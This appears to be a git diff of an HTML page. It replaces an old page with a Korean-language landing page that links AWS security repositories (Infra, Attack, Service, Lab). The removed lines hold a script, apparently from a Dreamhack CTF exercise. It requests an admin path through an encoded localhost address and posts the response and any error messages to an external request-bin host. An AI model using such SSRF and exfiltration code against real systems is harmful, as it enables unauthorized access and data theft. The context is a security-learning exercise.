@@ -1,51 +1,224 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>AWS Security Projects</title>
+    <meta name="description" content="AWS 보안 관련 프로젝트 모음 — Infra, Attack, Service, Lab">
+    <style>
+        :root {
+            --bg: #0b1220;
+            --bg-soft: #111a2e;
+            --card: #16223c;
+            --card-hover: #1d2d4f;
+            --border: #27375c;
+            --text: #e8edf7;
+            --muted: #94a3c4;
+            --accent: #ff9900;
+            --accent-soft: #ffb84d;
+            --aws-blue: #4d9fff;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, "Malgun Gothic", sans-serif;
+            background:
+                radial-gradient(1200px 600px at 80% -10%, rgba(255,153,0,0.12), transparent 60%),
+                radial-gradient(1000px 500px at 0% 110%, rgba(77,159,255,0.12), transparent 55%),
+                var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+        .wrap {
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 72px 24px 96px;
+        }
+        header { text-align: center; margin-bottom: 56px; }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--accent);
+            border: 1px solid var(--border);
+            background: rgba(255,153,0,0.08);
+            padding: 6px 14px;
+            border-radius: 999px;
+            margin-bottom: 22px;
+        }
+        .badge::before {
+            content: "";
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+        }
+        h1 {
+            font-size: clamp(2rem, 5vw, 3.1rem);
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 14px;
+        }
+        h1 .hl { color: var(--accent); }
+        .subtitle {
+            color: var(--muted);
+            font-size: clamp(1rem, 2.2vw, 1.15rem);
+            max-width: 620px;
+            margin: 0 auto;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 22px;
+        }
+        .card {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 28px 26px;
+            text-decoration: none;
+            color: inherit;
+            overflow: hidden;
+            transition: transform .22s ease, border-color .22s ease, box-shadow .22s ease, background .22s ease;
+        }
+        .card::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255,153,0,0.0), rgba(255,153,0,0.08));
+            opacity: 0;
+            transition: opacity .22s ease;
+        }
+        .card:hover {
+            transform: translateY(-6px);
+            border-color: var(--accent);
+            background: var(--card-hover);
+            box-shadow: 0 18px 40px -18px rgba(255,153,0,0.45);
+        }
+        .card:hover::after { opacity: 1; }
+        .card-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+        .icon {
+            width: 48px; height: 48px;
+            border-radius: 12px;
+            display: grid;
+            place-items: center;
+            font-size: 1.4rem;
+            background: rgba(255,153,0,0.12);
+            border: 1px solid var(--border);
+        }
+        .tag {
+            font-size: 0.72rem;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--muted);
+            border: 1px solid var(--border);
+            padding: 4px 10px;
+            border-radius: 999px;
+        }
+        .card h2 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        .card p {
+            color: var(--muted);
+            font-size: 0.95rem;
+            flex: 1;
+            position: relative;
+            z-index: 1;
+        }
+        .card-cta {
+            margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: var(--accent);
+            font-size: 0.95rem;
+            position: relative;
+            z-index: 1;
+        }
+        .card-cta .arrow { transition: transform .22s ease; }
+        .card:hover .card-cta .arrow { transform: translateX(5px); }
+        footer {
+            margin-top: 64px;
+            text-align: center;
+            color: var(--muted);
+            font-size: 0.88rem;
+        }
+        footer a { color: var(--aws-blue); text-decoration: none; }
+        footer a:hover { text-decoration: underline; }
+    </style>
 </head>
 <body>
-    <h1>
-        <div id="result-box"></div>
-    </h1>
-    <script>
-        fetch("http://host3.dreamhack.games:14995/validation?url=0x00000000:3333/admin", {
-            method: 'GET',
-            'refer': '192.168.0.1'
-        }).then(response => {
-            if (!response.ok) {
-                throw new Error("네트워크 응답 실패");
-            }
-            return response.text()
-        }).then(htmlString => {
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(htmlString, 'text/html');
+    <div class="wrap">
+        <header>
+            <span class="badge">AWS Security</span>
+            <h1>AWS <span class="hl">Security</span> Projects</h1>
+            <p class="subtitle">AWS 보안 인프라 · 공격 · 서비스 · 실습을 다루는 프로젝트 모음입니다. 아래 카드를 눌러 각 저장소로 이동하세요.</p>
+        </header>
 
-            const targetElement = doc.querySelector('#result-box');
+        <main class="grid">
+            <a class="card" href="https://github.com/protruser/AWS-Security-Infra" target="_blank" rel="noopener">
+                <div class="card-top">
+                    <div class="icon">🏗️</div>
+                    <span class="tag">Infra</span>
+                </div>
+                <h2>AWS Security Infra</h2>
+                <p>보안이 적용된 AWS 인프라 구성과 아키텍처를 다루는 저장소입니다.</p>
+                <span class="card-cta">저장소 열기 <span class="arrow">→</span></span>
+            </a>
 
-            fetch("https://rtjpgyy.request.dreamhack.games", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: htmlString
-            });
+            <a class="card" href="https://github.com/protruser/AWS-Security-Attack" target="_blank" rel="noopener">
+                <div class="card-top">
+                    <div class="icon">🎯</div>
+                    <span class="tag">Attack</span>
+                </div>
+                <h2>AWS Security Attack</h2>
+                <p>AWS 환경에 대한 공격 기법과 시나리오를 정리한 저장소입니다.</p>
+                <span class="card-cta">저장소 열기 <span class="arrow">→</span></span>
+            </a>
 
-            if (targetElement) {
-                const resValue = targetElement.textContent;
-                console.log(resValue);
+            <a class="card" href="https://github.com/protruser/AWS-Security-Service" target="_blank" rel="noopener">
+                <div class="card-top">
+                    <div class="icon">🛡️</div>
+                    <span class="tag">Service</span>
+                </div>
+                <h2>AWS Security Service</h2>
+                <p>AWS 보안 서비스 활용과 구성 방법을 다루는 저장소입니다.</p>
+                <span class="card-cta">저장소 열기 <span class="arrow">→</span></span>
+            </a>
 
-                document.getElementById("result-box").textContent = resValue;
-            } else {
-                document.getElementById("result-box").textContent = htmlString;
-                console.log(htmlString)
-            }
-        }).catch(error => {
-            fetch("https://rtjpgyy.request.dreamhack.games", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: "공격 실패 에러 로그: " + error.message
-            });
-        });
-    </script>
+            <a class="card" href="https://github.com/protruser/AWS-security" target="_blank" rel="noopener">
+                <div class="card-top">
+                    <div class="icon">🔐</div>
+                    <span class="tag">Lab</span>
+                </div>
+                <h2>AWS Security</h2>
+                <p>AWS 보안 전반의 실습과 학습 자료를 모아둔 저장소입니다.</p>
+                <span class="card-cta">저장소 열기 <span class="arrow">→</span></span>
+            </a>
+        </main>
+
+        <footer>
+            <p>Maintained by <a href="https://github.com/protruser" target="_blank" rel="noopener">@protruser</a> · Hosted on GitHub Pages</p>
+        </footer>
+    </div>
 </body>
 </html>
